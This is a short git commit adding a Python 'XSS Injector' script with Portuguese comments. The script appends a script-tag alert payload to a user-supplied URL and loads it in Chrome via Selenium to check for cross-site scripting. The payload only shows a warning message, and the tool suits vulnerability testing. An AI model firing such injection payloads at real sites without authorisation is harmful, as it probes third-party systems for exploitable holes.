bbad3e8d044392b37154d3e5af13769aa8aef24e
Paulo19961944 <paulo24041996@gmail.com>
2024-03-23 21:48:14 -0300

    XSS Injector - V1.0.0

---
+++ main.py
@@ -0,0 +1,18 @@
+from selenium import webdriver 
+import time
+
+# Captura a URL e insere um código de Injeção XSS
+url = input("Digite a URL a ser Pesquisada: ")
+urlXSS = url + '\'<script>window.alert("Esse site está vlunerável a falhas XSS")</script>\''
+
+# Abre o Chrome
+driver = webdriver.Chrome()
+
+# Apenas carrega a URL fornecida
+driver.get(urlXSS)
+
+# Espera 60 segundos (ou qualquer outro tempo que você preferir) antes de fechar o navegador
+time.sleep(60)
+
+# Encerra o Programa
+driver.quit()
